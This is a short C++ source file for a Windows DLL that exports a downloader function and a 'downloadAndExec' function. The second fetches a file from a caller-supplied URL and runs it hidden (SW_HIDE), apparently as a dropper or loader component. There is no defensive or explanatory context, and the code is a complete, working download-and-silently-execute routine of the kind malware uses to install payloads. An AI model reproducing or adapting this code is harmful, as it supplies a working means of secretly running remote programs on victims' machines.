// downloader.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "downloader.h"

#pragma comment(lib, "urlmon.lib")
#pragma warning(disable: 4996)


extern "C"
{
	__declspec(dllexport) BOOL downloader(char * URL, char * FileName)
	{
		//CHAR szURL[1024];
		//CHAR szFileName[1024];
		//memset(szURL, 0, sizeof(szURL));
		//memset(szFileName, 0, sizeof(szFileName));
		//MultiByteToWideChar(CP_ACP, 0, URL, strlen(URL) + 1, szURL, sizeof(szURL) / sizeof(szURL[0]));
		//MultiByteToWideChar(CP_ACP, 0, FileName, strlen(FileName) + 1, szFileName, sizeof(szFileName) / sizeof(szFileName[0]));

		//MessageBoxA(0, "start", "start download", MB_OK);
		HRESULT result = URLDownloadToFile(NULL, URL, FileName, NULL, NULL);
		if (result == S_OK) return TRUE;
		else return FALSE;
	}

	__declspec(dllexport) BOOL downloadAndExec(char * URL, char * FileName)
	{
		if (downloader(URL, FileName))
		{
			//MessageBoxA(NULL, "Download success", "Download Succ ess", MB_OK);
			WinExec(FileName, SW_HIDE);
			return TRUE;
		}
		else
		{
			//essageBoxA(NULL, "Download Fail", "Download Fail", MB_OK);
			return FALSE;
		}
	}
}